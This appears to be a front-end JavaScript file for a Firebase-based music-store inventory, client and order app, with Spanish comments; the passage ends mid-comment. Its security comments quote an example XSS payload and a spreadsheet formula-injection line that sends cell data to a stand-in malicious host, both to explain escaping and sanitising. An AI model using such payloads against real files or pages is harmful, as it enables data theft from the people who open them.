// =========================================================
// Musical Fever — Conexión a Firebase Realtime Database
// =========================================================

const firebaseConfig = {
  apiKey: "AIzaSyA9FV_99ZY5VTrw-3n4UJQg7NAV6BRdcOM",
  authDomain: "fever-83517.firebaseapp.com",
  databaseURL: "https://fever-83517-default-rtdb.firebaseio.com",
  projectId: "fever-83517",
  storageBucket: "fever-83517.firebasestorage.app",
  messagingSenderId: "378774864869",
  appId: "1:378774864869:web:f31f4f82a927e78d3d650c",
  measurementId: "G-0KHV5C5PFY"
};

firebase.initializeApp(firebaseConfig);

// =========================================================
// escapeHtml — convierte texto libre (nombre de producto,
// descripción, nombre de cliente, ciudad, etc.) en algo seguro
// para insertar con innerHTML.
//
// Sin esto, cualquier campo que un usuario pueda escribir (o traer
// por Excel) podía contener HTML/JS real: alguien escribe
// <img src=x onerror="..."> como nombre de un producto, y ese
// código se ejecuta en la pantalla de TODOS los que abren Stock,
// Pedidos, Nueva Nota o Historial — incluido el admin. Se usaba
// innerHTML con los valores tal cual venían de Firebase, sin pasar
// por esto. Ahora TODO campo de texto libre se pasa por escapeHtml()
// antes de insertarse en cualquier plantilla de innerHTML.
function escapeHtml(str) {
  return String(str ?? '').replace(/[&<>"']/g, ch => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  }[ch]));
}

// escapeJsAttr — para cuando el texto va DENTRO de un onclick="..."
// con argumentos entre comillas simples, ej:
//   onclick="openEditStock('${escapeJsAttr(p.name)}')"
// Ahí el valor vive en dos capas a la vez: adentro de un string JS
// de comillas simples, y adentro de un atributo HTML de comillas
// dobles. Escapar solo la comilla simple (como se hacía antes) deja
// la comilla doble libre para romper el atributo HTML completo e
// inyectar attributes/tags nuevos. Acá se escapan ambas capas.
function escapeJsAttr(str) {
  return String(str ?? '')
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '&quot;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// sanitizeForExcel — distinto problema del XSS de arriba: cuando un
// nombre de producto/cliente se exporta a un archivo .xlsx (Stock,
// Clientes, Historial), esas celdas van tal cual dentro del archivo.
// Si un nombre empieza con =, +, - o @, Excel (y Google Sheets) lo
// puede interpretar como una FÓRMULA al abrir el archivo, no como
// texto — es la técnica conocida como "CSV/Excel Formula Injection".
// Alguien podría crear un producto con un nombre como
// =WEBSERVICE("http://sitio-malicioso.com/robar?"&A1) y ese código
// se ejecutaría solo con abrir el Excel exportado, sin que la
// persona haga nada más que abrir el archivo que ya abre siempre.
//
// El arreglo estándar: si el valor empieza con uno de esos
// caracteres, se le antepone un apóstrofe. Excel entonces lo
// muestra como texto plano en vez de evaluarlo como fórmula, y el
// apóstrofe no es visible al ver la celda.
function sanitizeForExcel(value) {
  const str = String(value ?? '');
  if (/^[=+\-@\t\r]/.test(str)) return "'" + str;
  return str;
}

// ── App Check (desactivado hasta que actives reCAPTCHA) ──────────
// Esto bloquea peticiones que no vengan de tu app real (scripts
// externos que copien tu configuración pública). No requiere login
// ni afecta a tus usuarios — es gratis en el plan Spark.
//
// Para activarlo:
//   1. Firebase Console → Compilación → App Check → Registra tu app
//      con reCAPTCHA v3, copia el "Site Key" que te dan.
//   2. Agrega este script en el <head> de cada HTML, antes de este
//      archivo: https://www.gstatic.com/firebasejs/10.13.0/firebase-app-check-compat.js
//   3. Descomenta las 5 líneas de abajo y pega tu Site Key.
//
// const appCheck = firebase.appCheck();
// appCheck.activate(
//   'TU_SITE_KEY_DE_RECAPTCHA_AQUI',
//   true // refresca el token automáticamente
// );

const db = firebase.database();

const refProducts = db.ref('products');
const refClients  = db.ref('clients');
const refOrders   = db.ref('orders');
const refUsers    = db.ref('users');

// =========================================================
// CACHÉ LOCAL + SINCRONIZACIÓN INCREMENTAL (products / clients)
// =========================================================
//
// Por qué existe esto: watchProducts/watchClients usaban
// refX.on('child_added'/'child_changed'/'child_removed') sobre el nodo
// COMPLETO. Firebase, al conectar un listener así por primera vez,
// reenvía TODOS los hijos existentes (dispara 'child_added' una vez
// por cada producto/cliente ya guardado). Eso pasa de nuevo cada vez
// que se recarga la página, se reabre la app, o el celular reconecta
// después de perder señal — con ~30 vendedores abriendo la app varias
// veces al día, esto era el mayor consumo de datos de toda la app y
// el principal responsable de acercarse al límite de 10GB/mes de
// descarga del plan gratis de Firebase (Spark).
//
// La solución: cada producto/cliente ahora guarda un campo
// "updatedAt" (ver saveProduct/addStock/decrementStock/saveClient más
// abajo). En vez de re-pedir TODO el nodo cada vez, se guarda en
// localStorage el resultado de la última sincronización y, la
// siguiente vez, se pide solo lo que cambió desde entonces
// (orderByChild('updatedAt').startAt(ultimaSync)) — una consulta
// mucho más chica en la enorme mayoría de los casos.
//
// Limitación aceptada a cambio de ese ahorro: un producto/cliente
// BORRADO no se detecta con esa consulta incremental (ya no tiene
// updatedAt para matchear un rango — simplemente desaparece del
// nodo). Por eso cada tanto (FULL_RESYNC_INTERVAL_MS) se paga el
// costo completo una vez, para reconciliar borrados y cualquier
// desajuste. Si se necesita que un borrado se vea al instante en
// todos los dispositivos, hay que forzar un refresco completo desde
// ahí (recargar la app cuando ya tocó la resincronización, o subir
// el intervalo).
const FULL_RESYNC_INTERVAL_MS = 3 * 60 * 60 * 1000; // 3 horas

function readLocalCache(key) {
  try {
    if (typeof localStorage === 'undefined') return null;
    const raw = localStorage.getItem(key);
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    if (!parsed || typeof parsed !== 'object' || typeof parsed.items !== 'object') return null;
    return parsed;
  } catch (err) {
    return null; // localStorage corrupto, deshabilitado (modo privado) o inexistente: se sigue sin caché
  }
}

function writeLocalCache(key, cache) {
  try {
    if (typeof localStorage === 'undefined') return;
    localStorage.setItem(key, JSON.stringify(cache));
  } catch (err) {
    // Cuota de localStorage llena u otro error: la app sigue
    // funcionando igual, solo sin el ahorro de datos del caché.
  }
}

// Arma un watcher con caché+delta genérico para una colección plana
// (products o clients), reutilizado por watchProducts/watchClients.
// idField: nombre de la clave del hijo dentro de cada objeto emitido
// (ej. 'code' para productos, 'ruc' para clientes).
// Devuelve un objeto { forceRefresh } además de arrancar el watcher.
// forceRefresh() permite a otras pantallas (ej. import-stock.js
// después de terminar una importación) pedir una lectura fresca de
// TODO el nodo ahora mismo, sin esperar al listener en tiempo real
// ni a la resincronización periódica de 3 horas. Esto es lo que
// garantiza que, apenas termina una importación, los datos se vean
// actualizados al instante en la propia pantalla que importó —
// incluso si por cualquier motivo el listener en vivo tarda o falla
// en avisar (websocket que tarda un instante en reflejar la propia
// escritura, pestaña que estuvo en segundo plano, etc.).
function watchCollectionWithCache(ref, cacheKey, idField, callback, onError) {
  const itemsMap = new Map();
  let emitTimer = null;
  const scheduleEmit = () => {
    if (emitTimer) return;
    emitTimer = setTimeout(() => {
      emitTimer = null;
      callback(Array.from(itemsMap.values()));
    }, 50);
  };

  const cache = readLocalCache(cacheKey);
  const now = Date.now();
  const needsFullResync = !cache || !cache.lastFullSync || (now - cache.lastFullSync) > FULL_RESYNC_INTERVAL_MS;
  const lastFullSyncToKeep = (cache && !needsFullResync) ? cache.lastFullSync : now;

  // 1) Pintar de inmediato con lo último guardado localmente, sin
  // esperar ninguna respuesta de red — así la pantalla no queda en
  // blanco mientras se resuelve la sincronización de abajo.
  if (cache && cache.items) {
    Object.keys(cache.items).forEach(key => itemsMap.set(key, cache.items[key]));
    scheduleEmit();
  }

  function persist(lastSyncTs, lastFullSyncTs) {
    const items = {};
    itemsMap.forEach((v, k) => { items[k] = v; });
    writeLocalCache(cacheKey, { items, lastSync: lastSyncTs, lastFullSync: lastFullSyncTs });
  }

  function applySnapshotAndPersist(snap, lastSyncTs, lastFullSyncTs) {
    snap.forEach(child => {
      const val = child.val();
      if (val && val.deleted) { itemsMap.delete(child.key); return; } // borrado lógico: no se pinta ni se guarda en caché
      const item = { ...val };
      item[idField] = child.key;
      itemsMap.set(child.key, item);
    });
    scheduleEmit();
    persist(lastSyncTs, lastFullSyncTs);
  }

  const query = needsFullResync ? ref : ref.orderByChild('updatedAt').startAt(cache.lastSync + 1);
  if (needsFullResync) itemsMap.clear(); // resincronización completa: se descarta el caché viejo por si acaso quedó un borrado sin reflejar

  let lastFullSyncSoFar = lastFullSyncToKeep;

  // Trae TODO el nodo de nuevo ahora mismo (bypasea el filtro
  // incremental y la espera de 3 horas), reemplaza el caché en
  // memoria por completo (así también se limpian productos borrados
  // que hubieran quedado colgados) y re-emite a la pantalla. Se
  // reintenta la lectura tal cual pase lo que pase con la conexión
  // en vivo — es una lectura de "una sola vez", no depende de que el
  // listener esté conectado.
  function forceRefresh() {
    return ref.once('value').then(snap => {
      itemsMap.clear();
      const ts = Date.now();
      lastFullSyncSoFar = ts;
      applySnapshotAndPersist(snap, ts, ts);
    }).catch(err => {
      if (onError) onError(err);
      throw err;
    });
  }

  query.once('value').then(snap => {
    applySnapshotAndPersist(snap, now, lastFullSyncSoFar);

    // 2) De ahora en más, cualquier alta o cambio (de este dispositivo
    // o de cualquier otro) llega en tiempo real, pero SOLO a partir de
    // este instante — con esto se evita volver a recibir (y bajar) el
    // catálogo entero como haría un .on('child_added') sin filtro.
    const liveQuery = ref.orderByChild('updatedAt').startAt(now);
    liveQuery.on('child_added', s => {
      const val = s.val();
      if (val && val.deleted) {
        // Puede pasar con un producto que YA existía antes de abrir
        // esta pantalla (su updatedAt viejo quedaba fuera del rango
        // que vigila este listener) y se borra lógicamente recién
        // ahora: al entrar su updatedAt nuevo en rango, Firebase lo
        // avisa como 'child_added' (primera vez que matchea la
        // query), no como 'child_changed'. Si no se sacara acá
        // también, quedaría visible para siempre en esta pantalla.
        itemsMap.delete(s.key);
        scheduleEmit();
        persist(Date.now(), lastFullSyncSoFar);
        return;
      }
      const item = { ...val }; item[idField] = s.key;
      itemsMap.set(s.key, item);
      scheduleEmit();
      persist(Date.now(), lastFullSyncSoFar);
    }, onError);
    liveQuery.on('child_changed', s => {
      const val = s.val();
      if (val && val.deleted) {
        // Borrado lógico hecho en cualquier dispositivo: llega como un
        // cambio normal (mismo canal que editar precio/stock), así que
        // se refleja al instante en todas las pantallas abiertas.
        itemsMap.delete(s.key);
        scheduleEmit();
        persist(Date.now(), lastFullSyncSoFar);
        return;
      }
      const item = { ...val }; item[idField] = s.key;
      itemsMap.set(s.key, item);
      scheduleEmit();
      persist(Date.now(), lastFullSyncSoFar);
    }, onError);

    watchCollectionWithCache._activeQueries.push(liveQuery);
  }).catch(onError);

  return { forceRefresh };
}
watchCollectionWithCache._activeQueries = [];

// =========================================================
// PRODUCTOS
// =========================================================

// Tiempo real solo en Stock y Nueva Nota — donde el usuario necesita
// ver cambios al instante (otro vendedor edita stock). Carga inicial
// con caché+delta y eventos incrementales en tiempo real desde ahí en
// adelante — ver el bloque "CACHÉ LOCAL + SINCRONIZACIÓN INCREMENTAL"
// más arriba para el detalle completo de por qué y cómo.
function watchProducts(callback) {
  const onError = err => {
    console.error('[Firebase] Error leyendo /products:', err);
    alert('No se pudo cargar el stock (permiso denegado o sin conexión). Revisa la consola para más detalle.');
  };
  const watcher = watchCollectionWithCache(refProducts, 'mf_cache_products_v1', 'code', callback, onError);
  // Se guarda la referencia global al watcher de productos para que
  // cualquier otra pantalla (ej. import-stock.js) pueda pedir un
  // refresco inmediato después de escribir en Firebase, en vez de
  // depender únicamente del listener en tiempo real.
  window._productsWatcher = watcher;
  return watcher;
}

// Fuerza a que Stock (y cualquier otra vista que use watchProducts)
// vuelva a leer /products completo ahora mismo, ignorando el caché
// local y la ventana de 3 horas. Se usa después de importar/guardar
// en bloque para que los datos actualizados aparezcan al instante,
// sin depender de que el listener en tiempo real llegue a tiempo.
// Devuelve una promesa que resuelve cuando el refresco terminó.
function refreshProductsNow() {
  if (window._productsWatcher && typeof window._productsWatcher.forceRefresh === 'function') {
    return window._productsWatcher.forceRefresh();
  }
  // watchProducts todavía no corrió en esta pantalla (ej. se llamó
  // desde una vista donde Stock no está montado) — no hay nada que
  // refrescar en memoria, pero al menos se limpia el caché guardado
  // para que la próxima vez que se abra Stock traiga todo de nuevo.
  try {
    if (typeof localStorage !== 'undefined') localStorage.removeItem('mf_cache_products_v1');
  } catch (err) {}
  return Promise.resolve();
}

// Antes: "Guardar cambios" en el modal de Editar producto hacía un
// set() completo, incluyendo el stock que estaba cargado en el
// formulario desde que se abrió el modal. Si mientras tanto alguien
// vendía ese mismo producto (el stock real bajaba), guardar el
// formulario pisaba ese cambio real con el valor viejo — como si la
// venta nunca hubiera pasado.
//
// Ahora: los campos normales (nombre, descripción, precio,
// categoría) se actualizan aparte y nunca tocan el stock. El stock
// se aplica con concurrencia optimista — se pasa el valor que el
// formulario tenía al abrirse (expectedStock); si el valor real en
// el servidor sigue siendo ese mismo, se aplica el cambio con
// seguridad. Si cambió mientras tanto (alguien vendió o ajustó el
// producto), se cancela y se avisa, en vez de pisarlo en silencio.
function saveProduct(code, data, expectedStock, isNew) {
  const { stock, ...restRaw } = data;
  // "updatedAt" es lo que permite a watchProducts (ver bloque de
  // caché arriba) pedir solo lo que cambió desde la última vez, en
  // vez de bajar el catálogo entero cada vez que se abre la app.
  // Va en TODA escritura de producto, incluso si "rest" venía vacío.
  const rest = { ...restRaw, updatedAt: firebase.database.ServerValue.TIMESTAMP };
  const productRef = refProducts.child(code);

  if (stock === undefined) {
    return productRef.update(rest);
  }

  if (isNew) {
    // Producto nuevo: la pantalla ya revisó que el código no
    // estuviera en su copia local de la lista, pero esa copia
    // puede estar unos segundos desactualizada. Si dos personas
    // crean "GTR-006" casi al mismo tiempo, sin esto la segunda
    // sobreescribiría en silencio el producto de la primera. La
    // transacción solo confirma la escritura si el nodo sigue
    // vacío en el servidor en ese instante; si no, se cancela y
    // se avisa en vez de pisar el producto ya creado.
    //
    // Excepción: si el nodo existe pero está marcado deleted:true
    // (borrado lógico, ver deleteProduct), NO cuenta como "ya
    // existe" — se permite la escritura y listo, porque para el
    // usuario ese código simplemente no está en uso. Sin este
    // caso, recrear un código que se había borrado (ej. reimportar
    // el Excel completo después de "Eliminar todo") fallaba
    // siempre, porque el nodo viejo seguía ahí aunque oculto.
    return productRef.transaction(current => {
      if (current !== null && !current.deleted) return; // aborta: el código ya existe y sigue activo
      return { ...rest, stock };
    }).then(result => {
      if (!result.committed) {
        throw new Error(
          `Ya existe un producto con el código ${code} (lo acaba de crear otra persona). ` +
          'Recarga la lista y edítalo desde ahí en vez de crearlo de nuevo.'
        );
      }
    });
  }

  if (expectedStock === undefined) {
    // No hay un valor previo con el que compararse (ej. import
    // masivo actualizando solo precio/nombre en un producto que ya
    // existe) — se escribe directo, no hace falta transacción
    // porque no hay nada con lo que pueda chocar.
    return productRef.update({ ...rest, stock });
  }

  const fieldsUpdate = productRef.update(rest);
  const stockUpdate = productRef.child('stock').transaction(current => {
    if ((current || 0) === expectedStock) return stock;
    return; // aborta: el stock cambió mientras se editaba
  }).then(result => {
    if (!result.committed) {
      throw new Error(
        'El stock cambió mientras editabas este producto (alguien lo vendió o ajustó). ' +
        'El nombre/precio sí se guardaron; vuelve a abrir el producto para ver el stock real y ajustarlo de nuevo si hace falta.'
      );
    }
  });

  return Promise.all([fieldsUpdate, stockUpdate]);
}

// Cambia la clave (código) de un producto ya existente. Firebase no
// permite "mover" una clave directamente — hay que copiar los datos
// a la clave nueva y borrar la vieja. Se hace en dos pasos seguros:
// 1) se "reserva" la clave nueva con una transacción (igual que al
//    crear un producto) para no pisar uno que otra persona haya
//    creado con ese mismo código justo en ese instante;
// 2) se mueve el dato real con un update() multi-ruta, que Firebase
//    aplica de forma atómica (o se escriben ambas rutas, o ninguna).
function renameProductCode(oldCode, newCode) {
  const newRef = refProducts.child(newCode);
  return newRef.transaction(current => {
    if (current !== null && !current.deleted) return; // aborta: ya existe un producto activo con el código nuevo
    return true; // valor temporal, se reemplaza por los datos reales abajo
  }).then(result => {
    if (!result.committed) {
      throw new Error(`Ya existe un producto con el código ${newCode}.`);
    }
    return refProducts.child(oldCode).once('value');
  }).then(snap => {
    const data = snap.val();
    if (data === null) {
      // El producto original desapareció entre que se abrió el modal
      // y se guardó (ej. lo borraron desde otro dispositivo) — se
      // libera la clave nueva que se había reservado y se avisa.
      return newRef.remove().then(() => {
        throw new Error('El producto original ya no existe.');
      });
    }
    const updates = {};
    updates[oldCode] = null;
    updates[newCode] = { ...data, updatedAt: firebase.database.ServerValue.TIMESTAMP };
    return refProducts.update(updates);
  });
}

// Antes: .remove() físico del nodo. Problema: el listener en tiempo
// real de otras pantallas/dispositivos (watchCollectionWithCache)
// solo escucha altas y cambios dentro de una ventana que arranca
// desde que esa pantalla se abrió (orderByChild('updatedAt').startAt(now))
// — a un borrado real no le cambia el updatedAt, simplemente
// desaparece, así que ese listener nunca se entera. El único momento
// en que un borrado se reflejaba en otro dispositivo era la
// resincronización completa cada 3 horas (FULL_RESYNC_INTERVAL_MS).
//
// Ahora: borrado lógico. En vez de eliminar el nodo, se marca
// deleted:true y se pisa updatedAt con la hora del servidor — esto
// es indistinguible de una edición normal para el resto de la app,
// así que SÍ le llega a cualquier pantalla abierta en cualquier
// dispositivo por el canal de 'child_changed' que ya existe, al
// instante. watchCollectionWithCache filtra los items con
// deleted:true antes de mostrarlos (ver applySnapshotAndPersist).
function deleteProduct(code) {
  try {
    return refProducts.child(code).update({
      deleted: true,
      stock: 0,
      updatedAt: firebase.database.ServerValue.TIMESTAMP
    });
  } catch (err) {
    // .child() valida la clave de forma SÍNCRONA — si el código tiene
    // un carácter que Firebase rechaza (dato viejo de antes de que
    // existiera el saneo de códigos), esto lanza una excepción normal
    // de JS en vez de una promesa rechazada, lo que puede tumbar
    // código que espera un .catch(). Se envuelve para que siempre se
    // comporte como una promesa, sin importar dónde se llame.
    return Promise.reject(err);
  }
}

// Antes: leía el stock, restaba en JavaScript y guardaba — dos
// vendedores confirmando el mismo producto al mismo tiempo podían
// leer el mismo valor y pisarse el resultado uno al otro (además de
// que un valor insuficiente simplemente se "recortaba" a 0 sin avisar,
// permitiendo vender de más sin que nadie se enterara).
//
// Ahora cada producto se descuenta con una transacción real: el
// servidor de Firebase la resuelve de forma atómica, reintentando
// sola si hay conflicto, y CANCELA la operación (sin guardar nada)
// si no hay stock suficiente en el momento exacto de aplicarla.
// Suma una cantidad al stock actual de un producto (ej. importar un
// Excel al llegar un contenedor). Transacción segura: no pisa ventas
// que estén pasando al mismo tiempo, cada suma se aplica sobre el
// valor real más reciente del servidor.
function addStock(code, qty) {
  const productRef = refProducts.child(code);
  const stockUpdate = productRef.child('stock').transaction(current => (current || 0) + qty);
  // "updatedAt" se actualiza en paralelo (no dentro de la misma
  // transacción, que solo puede tocar /products/{code}/stock) para
  // que la sincronización incremental de watchProducts detecte este
  // cambio en la próxima carga sin tener que rebajar todo /products.
  const touch = productRef.update({ updatedAt: firebase.database.ServerValue.TIMESTAMP }).catch(() => {});
  return stockUpdate.then(result => touch.then(() => result));
}

async function decrementStock(items) {
  const results = await Promise.all(items.map(async item => {
    const stockRef = refProducts.child(item.code).child('stock');
    const result = await stockRef.transaction(current => {
      const currentStock = current || 0;
      if (currentStock < item.qty) return; // aborta: no hay suficiente
      return currentStock - item.qty;
    });
    if (result.committed) {
      // Igual que en addStock: bump de updatedAt en paralelo, fuera de
      // la transacción, para que la venta se refleje en la próxima
      // sincronización incremental de watchProducts.
      refProducts.child(item.code).update({ updatedAt: firebase.database.ServerValue.TIMESTAMP }).catch(() => {});
    }
    return { code: item.code, qty: item.qty, ok: result.committed };
  }));

  const failed    = results.filter(r => !r.ok);
  const succeeded = results.filter(r => r.ok);

  if (failed.length > 0) {
    // BUG REAL que había acá: las transacciones de cada producto se
    // disparan en paralelo (Promise.all), así que si un pedido tiene
    // 3 productos y el 3ro no tiene stock suficiente, los 2 primeros
    // YA se habían descontado con éxito antes de detectar el fallo.
    // Como el pedido completo no se guarda (ver confirmOrder()), eso
    // dejaba el inventario reducido "fantasma" sin ningún pedido real
    // detrás — se perdía stock silenciosamente cada vez que un
    // pedido con varios productos fallaba a medias.
    // Ahora, si algo falla, se revierte (best-effort) lo que sí se
    // había descontado, para que la operación sea todo-o-nada.
    await Promise.all(succeeded.map(r =>
      refProducts.child(r.code).child('stock').transaction(current => (current || 0) + r.qty)
        .then(() => refProducts.child(r.code).update({ updatedAt: firebase.database.ServerValue.TIMESTAMP }).catch(() => {}))
    )).catch(() => {});

    const err = new Error(
      'Stock insuficiente para: ' + failed.map(f => f.code).join(', ') +
      '. No se descontó nada (se revirtió lo que ya se había aplicado).'
    );
    err.failedItems = failed;
    throw err;
  }
  return results;
}

// =========================================================
// CLIENTES
// =========================================================

// Tiempo real en Pedidos — la lista de clientes debe estar siempre
// actualizada mientras el usuario trabaja. Mismo mecanismo de
// caché+delta que watchProducts (ver el bloque de arriba).
function watchClients(callback) {
  const onError = err => {
    console.error('[Firebase] Error leyendo /clients:', err);
    alert('No se pudo cargar la lista de clientes (permiso denegado o sin conexión). Revisa la consola para más detalle.');
  };
  watchCollectionWithCache(refClients, 'mf_cache_clients_v1', 'ruc', callback, onError);
}

// ── Apagar listeners en tiempo real antes de cerrar sesión ──────
// watchProducts/watchClients (y los sockets de Historial en
// watchNewOrders/watchOrderChanges/watchOrderRemovals) quedan
// escuchando /products, /clients y /orders mientras la sesión está
// abierta. Si se hace signOut() sin apagarlos primero, ese mismo
// listener sigue activo un instante sin token de auth válido, las
// reglas de Firebase responden PERMISSION_DENIED, y eso disparaba
// los alert() de "no se pudo cargar..." justo al cerrar sesión.
// Esto NO borra ni cambia nada en Firebase — solo desconecta los
// oyentes activos de este cliente antes del signOut(), para que no
// alcancen a recibir ese error. Se llama desde logout()/
// switchAccount() en auth-guard.js, antes de firebase.auth().signOut().
function stopRealtimeWatchers() {
  refProducts.off();
  refClients.off();
  refOrders.off();
  // Las queries incrementales de watchProducts/watchClients
  // (orderByChild('updatedAt').startAt(...)) son objetos de query
  // aparte del ref plano de arriba — un .off() en el ref plano no las
  // desconecta a ellas. Se guardan todas en _activeQueries apenas se
  // crean, así que se apagan una por una acá.
  watchCollectionWithCache._activeQueries.forEach(q => q.off());
  watchCollectionWithCache._activeQueries.length = 0;
}

function saveClient(ruc, data) {
  return refClients.child(ruc).set({ ...data, updatedAt: firebase.database.ServerValue.TIMESTAMP });
}

function deleteClient(ruc) {
  return refClients.child(ruc).remove();
}

function getClient(ruc) {
  return refClients.child(ruc).get().then(snap => snap.val());
}

// =========================================================
// PEDIDOS / HISTORIAL
// =========================================================

// Historial se pagina por CANTIDAD (15 en 15, del más reciente al
// más antiguo), no por fecha — esto es lo que evita traer de un
// solo golpe todos los pedidos guardados. El límite de 30 días es
// un asunto totalmente aparte, que maneja de forma independiente el
// script diario scripts/limpiar-historial.js (borra cada pedido
// individualmente al cumplir su propio ciclo de 30 días). Estas
// funciones no tienen ninguna relación con esa retención.
// Borra una nota Y devuelve al stock los productos que tenía, porque
// borrar una nota desde Historial es una acción del admin para
// "anular" un pedido (por error, duplicado, cliente que se
// arrepintió, etc.) — si no se restaura el stock, el inventario
// queda permanentemente corto por productos que en realidad nunca
// salieron de la tienda.
//
// ⚠️ Esto es DISTINTO de la limpieza automática por antigüedad
// (autoCleanOldOrders en historial-logic.js, y el script diario
// scripts/limpiar-historial.js): esas ventas SÍ ocurrieron de
// verdad, solo se está archivando/purgando el registro histórico
// para no acumular datos para siempre — ahí NO corresponde
// restaurar stock, y por eso esos dos procesos llaman directo a
// refOrders.child(id).remove() en vez de pasar por esta función.
function deleteOrder(orderId, items) {
  const restore = (items && items.length)
    ? Promise.all(items.map(i => addStock(i.code, i.qty)))
    : Promise.resolve();
  return restore.then(() => refOrders.child(orderId).remove());
}

const HISTORIAL_PAGE_SIZE = 15;

function ordersSnapshotToList(snapshot) {
  const val = snapshot.val() || {};
  return Object.keys(val).map(id => ({ id, ...val[id] }));
}

function handleOrdersFetchError(err) {
  console.error('[Firebase] Error leyendo /orders:', err);
  alert('No se pudo cargar el historial (permiso denegado o sin conexión). Revisa la consola para más detalle.');
  return [];
}

// Primera página: los HISTORIAL_PAGE_SIZE pedidos más recientes.
function fetchOrdersFirstPage() {
  return refOrders
    .orderByChild('timestamp')
    .limitToLast(HISTORIAL_PAGE_SIZE)
    .once('value')
    .then(ordersSnapshotToList)
    .catch(handleOrdersFetchError);
}

// Siguiente página: los HISTORIAL_PAGE_SIZE pedidos inmediatamente
// más antiguos que "beforeTimestamp" (el más viejo ya cargado).
function fetchOrdersBefore(beforeTimestamp) {
  return refOrders
    .orderByChild('timestamp')
    .endBefore(beforeTimestamp)
    .limitToLast(HISTORIAL_PAGE_SIZE)
    .once('value')
    .then(ordersSnapshotToList)
    .catch(handleOrdersFetchError);
}

// Trae puntualmente los pedidos entre dos fechas exactas — se usa
// solo cuando el usuario busca por un rango "Desde/Hasta" que cae
// más atrás de lo que la paginación normal ya cargó, para que esa
// búsqueda sea siempre exacta.
function fetchOrdersPage(fromTimestamp, toTimestamp) {
  return refOrders
    .orderByChild('timestamp')
    .startAt(fromTimestamp)
    .endAt(toTimestamp)
    .once('value')
    .then(ordersSnapshotToList)
    .catch(handleOrdersFetchError);
}

// ── Tiempo real para notas NUEVAS ────────────────────────
// A diferencia de fetchOrdersFirstPage/fetchOrdersBefore (que son
// lecturas puntuales, .once, para no gastar de más), esto deja un
// socket abierto pero MUY barato: solo escucha pedidos con
// timestamp >= sinceTimestamp, es decir, los que se creen de ahora
// en adelante. Así, si alguien registra un pedido en Nueva Nota y
// el usuario está (o entra) a Historial, la nota aparece al toque
// sin recargar la página ni pedir nada de más.
function watchNewOrders(sinceTimestamp, callback) {
  refOrders
    .orderByChild('timestamp')
    .startAt(sinceTimestamp)
    .on('child_added', snapshot => {
      const val = snapshot.val();
      if (val) callback({ id: snapshot.key, ...val });
    });
}

// ── Tiempo real para notas EDITADAS ─────────────────────
// Sin esto, el caché de Historial (ordersCache en historial-logic.js)
// quedaba con la versión VIEJA de una nota después de editarla: al
// volver a Historial, loadHistorialData() reutiliza lo que ya está
// en memoria (para no gastar red de más) en vez de volver a pedir
// todo, así que el monto/ítems editados no se reflejaban hasta
// recargar la página entera (y a veces ni así, si el navegador
// también tenía cacheado el bundle). Este listener escucha CUALQUIER
// cambio en un pedido ya existente (lo dispara updateOrder) y avisa
// para refrescar el caché al instante, sin recargar nada.
function watchOrderChanges(callback) {
  refOrders.on('child_changed', snapshot => {
    const val = snapshot.val();
    if (val) callback({ id: snapshot.key, ...val });
  });
}

// ── Tiempo real para notas ELIMINADAS por otra sesión ───
// Cubre el caso de dos personas con Historial abierto a la vez: si
// una elimina una nota, la otra ya no debe seguir viéndola ni
// contándola en las estadísticas sin recargar.
function watchOrderRemovals(callback) {
  refOrders.on('child_removed', snapshot => {
    callback(snapshot.key);
  });
}

function saveOrder(orderData) {
  const newRef = refOrders.push();
  return newRef.set({ ...orderData, timestamp: Date.now() }).then(() => newRef.key);
}

// =========================================================
// NUMERACIÓN DE NOTAS (NP-AÑO-###)
// =========================================================
// ⚠️ BUG REAL que había acá: el número se generaba con
// Math.random() (100–999 al azar) y se mostraba en pantalla apenas
// se abría "Nueva Nota", sin reservarlo ni comprobar en Firebase si
// ya existía. Con solo 900 valores posibles por año, la probabilidad
// de que dos notas terminen con el MISMO número ("cumpleaños") ya es
// alta con relativamente pocas notas emitidas, y se vuelve una
// certeza matemática después de la nota 900 del año — sin contar que
// dos vendedores en sucursales distintas (Lima/Cusco/Tacna) podían
// abrir el formulario casi al mismo tiempo y recibir el mismo número
// por pura casualidad. Para una empresa real esto significa boletas/
// notas de pedido duplicadas, lo cual es un problema serio de cara
// al cliente y a cualquier control contable.
//
// Ahora el número se calcula leyendo las notas ya existentes de ESE
// año y tomando el siguiente correlativo (no al azar, no tiene techo
// de 900), y además se vuelve a verificar justo antes de guardar
// (ver confirmOrder() en nueva-nota-actions.js) por si otra persona
// generó/guardó una nota con ese mismo número en el ratito intermedio.
async function generateNextOrderNumber(year) {
  const prefix = `NP-${year}-`;
  const snapshot = await refOrders.once('value');
  const val = snapshot.val() || {};
  let maxSeq = 0;
  Object.values(val).forEach(o => {
    if (o && typeof o.numero === 'string' && o.numero.startsWith(prefix)) {
      const seq = parseInt(o.numero.slice(prefix.length), 10);
      if (!isNaN(seq) && seq > maxSeq) maxSeq = seq;
    }
  });
  return prefix + String(maxSeq + 1).padStart(3, '0');
}

// Revisa si ya existe una nota guardada con ese número exacto (usado
// como última comprobación antes de confirmar un pedido nuevo).
// Nota: no hay índice de Firebase sobre "numero" (solo sobre
// "timestamp", ver reglas de seguridad), así que esta lectura recorre
// /orders completo. Para un negocio de este tamaño no es un problema,
// pero si el volumen de notas crece mucho conviene agregar
// "numero" a ".indexOn" en las reglas.
async function orderNumberTaken(numero) {
  const snapshot = await refOrders.once('value');
  const val = snapshot.val() || {};
  return Object.values(val).some(o => o && o.numero === numero);
}

// Actualiza una nota ya existente (usado por "Editar" en Historial).
// No toca el timestamp original, para que la nota mantenga su
// posición/orden real de creación en el historial.
//
// ⚠️ Caso límite (poco frecuente en producción con 30 días, pero
// posible): una nota que se abre para editar puede ser eliminada
// por autoCleanOldOrders() (o por el script de GitHub Actions) justo
// al cumplir su retención MIENTRAS el usuario todavía tiene el
// formulario abierto. Si eso pasa, refOrders.child(id).update(...)
// NO falla — Firebase simplemente recrea el nodo solo con los campos
// de orderData, sin `timestamp`. Esa nota "fantasma" (timestamp
// undefined → tratado como 0 en autoCleanOldOrders) queda más vieja
// que cualquier cutoff posible, así que el próximo barrido de
// limpieza la vuelve a borrar de inmediato, silenciosamente: el
// usuario ve "✓ Nota actualizada" y segundos después la nota
// desaparece sin ningún aviso ni error.
//
